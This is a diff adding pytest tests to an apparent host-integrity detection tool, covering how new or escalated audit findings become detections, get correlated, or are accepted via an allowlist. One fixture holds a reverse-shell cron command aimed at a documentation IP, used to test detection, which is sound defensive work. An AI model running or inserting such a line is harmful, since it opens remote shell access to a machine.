@@ -6,13 +6,18 @@ the negative cases that must stay quiet. Synthetic data only.
 
 from __future__ import annotations
 
+import json
+from pathlib import Path
 from typing import Any
 
-from baseline_builders import rec
-from test_detection import NOW, one, reports, rules_for, run
+import pytest
+from baseline_builders import finding, rec
+from jsonschema import Draft202012Validator
+from test_detection import NOW, SCHEMA, _diff, one, reports, rules_for, run
 
+from shared.reporting.accepted import load as load_allowlist
 from shared.reporting.baseline import compare
-from shared.reporting.detection import detect
+from shared.reporting.detection import RULES, DiffInputError, detect, exit_code_for
 from shared.reporting.inventory import Options, build_snapshot
 
 # ------------------------------------------------- P0-2: SSH keys in the collector's key shape
@@ -191,3 +196,157 @@ def test_low_ports_are_unaffected_by_the_bucket_logic() -> None:
     assert rules_for(doc, "listener:tcp/0.0.0.0/4444") == {"BO-NET-001", "BO-NET-002"}
     swapped = run([lport("sshd", 22)], [lport("python3", 22)])
     assert one(swapped, "listener:tcp/0.0.0.0/22")["severity"] == "high"  # BO-NET-003, well known
+
+
+# --------------------- P0-3: new or escalated audit findings reach the rule layer (BO-FND-001)
+
+
+def fdet(
+    base_findings: list[dict[str, Any]],
+    cur_findings: list[dict[str, Any]],
+    base_recs: list[dict[str, Any]] | None = None,
+    cur_recs: list[dict[str, Any]] | None = None,
+    allow: Any = None,
+) -> dict[str, Any]:
+    """Detections for two reports that differ in their findings (and optionally in records)."""
+    base, cur = reports(base_recs or [], cur_recs or [])
+    base["findings"], cur["findings"] = base_findings, cur_findings
+    doc = detect(_diff(base, cur), NOW, allow=allow)
+    Draft202012Validator(SCHEMA).validate(doc)
+    return doc
+
+
+FINDING_KEY = "finding:PRC-DELETED-001"
+
+
+def test_new_high_finding_with_no_inventory_change_is_detected() -> None:
+    """Reproduced defect: the diff reported the finding (exit 4) but `detect` said exit 0."""
+    doc = fdet([], [finding("PRC-DELETED-001", "high")])
+    det = one(doc, FINDING_KEY)
+    assert (det["severity"], det["basis"]) == ("high", "heuristic")
+    assert det["subject"] == {
+        "domain": "findings",
+        "scope": "",
+        "key": FINDING_KEY,
+        "change": "added",
+    }
+    assert rules_for(doc, FINDING_KEY) == {"BO-FND-001"}
+    assert det["related_findings"] == ["PRC-DELETED-001"]
+    assert det["unknown"], "must say what the diff does not carry"
+    assert exit_code_for(doc) == 4
+
+
+def test_new_critical_finding_keeps_its_severity() -> None:
+    assert one(fdet([], [finding("X-1", "critical")]), "finding:X-1")["severity"] == "critical"
+
+
+@pytest.mark.parametrize("severity", ["info", "low", "medium"])
+def test_new_findings_below_high_are_context_not_detections(severity: str) -> None:
+    doc = fdet([], [finding("X-1", severity)])
+    assert doc["detections"] == [] and exit_code_for(doc) == 0
+
+
+def test_unchanged_finding_is_silent() -> None:
+    f = finding("X-1", "high", evidence=[("file", "/etc/a")])
+    assert fdet([f], [f])["detections"] == []
+
+
+def test_finding_that_gained_evidence_is_detected() -> None:
+    before = finding("PER-CRON-002", "high", evidence=[("file", "/etc/cron.d/old")])
+    after = finding(
+        "PER-CRON-002", "high", evidence=[("file", "/etc/cron.d/old"), ("file", "/etc/cron.d/new")]
+    )
+    det = one(fdet([before], [after]), "finding:PER-CRON-002")
+    assert det["subject"]["change"] == "modified"
+    assert det["evidence"] == [{"type": "audit-evidence", "ref": "/etc/cron.d/new"}]
+
+
+def test_finding_that_escalated_is_detected() -> None:
+    doc = fdet([finding("X-1", "medium")], [finding("X-1", "high")])
+    det = one(doc, "finding:X-1")
+    assert det["severity"] == "high"
+    assert det["attributes"] == [{"name": "severity", "before": "medium", "after": "high"}]
+
+
+def test_finding_that_improved_or_lost_evidence_is_silent() -> None:
+    assert fdet([finding("X-1", "high")], [finding("X-1", "medium")])["detections"] == []
+    two = finding("X-2", "high", evidence=[("file", "/a"), ("file", "/b")])
+    one_ev = finding("X-2", "high", evidence=[("file", "/a")])
+    assert fdet([two], [one_ev])["detections"] == []  # evidence removed: remediation
+    assert fdet([finding("X-3", "high")], [])["detections"] == []  # resolved
+
+
+def test_finding_already_covered_by_an_equally_severe_detection_is_not_repeated() -> None:
+    ev = [("file", "/etc/cron.d/x")]
+    job = rec(
+        "scheduled_tasks",
+        "cron:/etc/cron.d/x#1",
+        {"command": "/tmp/x.sh", "schedule": "* * * * *", "user": "root"},
+        scope="cron",
+        evidence=ev,
+    )
+    doc = fdet([], [finding("PER-CRON-002", "high", evidence=ev)], [], [job])
+    assert [d["subject"]["key"] for d in doc["detections"]] == ["cron:/etc/cron.d/x#1"]
+    assert doc["detections"][0]["severity"] == "high"  # BO-EXE-001 already rates it high
+
+
+def test_finding_more_severe_than_its_covering_detection_is_reported_and_linked() -> None:
+    """A reverse-shell cron line: the inventory rules say medium, the audit finding says high."""
+    ev = [("file", "/etc/cron.d/x")]
+    job = rec(
+        "scheduled_tasks",
+        "cron:/etc/cron.d/x#1",
+        {"command": "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1", "user": "root"},
+        scope="cron",
+        evidence=ev,
+    )
+    doc = fdet([], [finding("PER-CRON-002", "high", evidence=ev)], [], [job])
+    cron_det = one(doc, "cron:/etc/cron.d/x#1")
+    fnd = one(doc, "finding:PER-CRON-002")
+    assert (cron_det["severity"], fnd["severity"]) == ("medium", "high")
+    assert [c["id"] for c in cron_det["correlated"]] == [fnd["id"]]
+    assert [c["id"] for c in fnd["correlated"]] == [cron_det["id"]]
+    assert doc["summary"]["total"] == 2
+
+
+def test_malformed_finding_entry_is_a_rule_error_not_a_crash_or_a_clean_result() -> None:
+    base, cur = reports([], [])
+    diff = _diff(base, cur)
+    diff["findings"]["new"] = [{"id": "X-1", "severity": "bogus"}, {"severity": "high"}, "text"]
+    doc = detect(diff, NOW)
+    assert doc["detections"] == []
+    assert [e["rule"] for e in doc["coverage"]["rule_errors"]] == ["BO-FND-001"] * 3
+    assert not doc["coverage"]["complete"] and exit_code_for(doc) == 6
+
+
+def test_findings_section_of_the_wrong_shape_is_rejected() -> None:
+    base, cur = reports([], [])
+    diff = _diff(base, cur)
+    diff["findings"]["new"] = "not a list"
+    with pytest.raises(DiffInputError):
+        detect(diff, NOW)
+
+
+def test_finding_detection_can_be_accepted_with_an_exact_entry(tmp_path: Path) -> None:
+    entry = {
+        "id": "AC-1",
+        "rules": ["BO-FND-001"],
+        "domain": "findings",
+        "key": FINDING_KEY,
+        "max_severity": "high",
+        "reason": "reviewed, known maintenance process",
+        "approved_by": "analyst",
+        "approved_at": "2026-03-01T00:00:00Z",
+        "expires": "2026-04-01T00:00:00Z",
+    }
+    path = tmp_path / "accepted.json"
+    path.write_text(
+        json.dumps({"kind": "accepted-changes", "schema_version": "0.1.0", "entries": [entry]}),
+        encoding="utf-8",
+    )
+    allow = load_allowlist(str(path), frozenset(r.rule_id for r in RULES))
+    doc = fdet([], [finding("PRC-DELETED-001", "high")], allow=allow)
+    assert doc["detections"] == [] and doc["summary"]["accepted"] == 1
+    assert exit_code_for(doc) == 0
+    crit = fdet([], [finding("PRC-DELETED-001", "critical")], allow=allow)
+    assert crit["summary"]["total"] == 1, "a critical detection can never be accepted"
